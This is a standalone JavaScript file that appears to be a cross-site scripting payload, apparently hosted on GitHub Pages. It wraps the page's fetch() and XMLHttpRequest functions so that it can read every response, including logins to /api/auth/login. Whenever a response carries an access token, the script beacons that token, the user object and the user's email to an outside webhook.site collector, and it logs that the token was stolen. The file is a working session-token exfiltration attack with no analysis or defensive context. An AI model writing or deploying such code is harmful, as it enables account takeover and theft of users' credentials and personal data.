(function() {
    // Hook fetch()
    var originalFetch = window.fetch;
    window.fetch = function() {
        var args = arguments;
        return originalFetch.apply(this, args).then(function(response) {
            var clone = response.clone();
            clone.json().then(function(data) {
                if (data && data.access_token) {
                    navigator.sendBeacon(
                        'https://webhook.site/11f969c8-5b06-4d0a-a7c8-d80bb7a2f322',
                        JSON.stringify({
                            token: data.access_token,
                            user: data.user,
                            email: data.user ? data.user.email : null,
                            timestamp: new Date().toISOString()
                        })
                    );
                    console.log('[XSS] Token stolen:', data.access_token);
                }
            }).catch(function() {});
            return response;
        });
    };

    // Hook XMLHttpRequest
    var originalOpen = XMLHttpRequest.prototype.open;
    var originalSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url) {
        this._url = url;
        return originalOpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function(body) {
        var self = this;
        this.addEventListener('load', function() {
            if (self._url && self._url.indexOf('/api/auth/login') !== -1 && self.status === 200) {
                try {
                    var data = JSON.parse(self.responseText);
                    if (data && data.access_token) {
                        navigator.sendBeacon(
                            'https://webhook.site/11f969c8-5b06-4d0a-a7c8-d80bb7a2f322',
                            JSON.stringify({
                                token: data.access_token,
                                user: data.user,
                                email: data.user ? data.user.email : null,
                                timestamp: new Date().toISOString()
                            })
                        );
                        console.log('[XSS] Token stolen via XHR:', data.access_token);
                    }
                } catch(e) {}
            }
        });
        return originalSend.apply(this, arguments);
    };

    console.log('[XSS] Payload loaded from GitHub Pages – token interceptor installed.');
})();
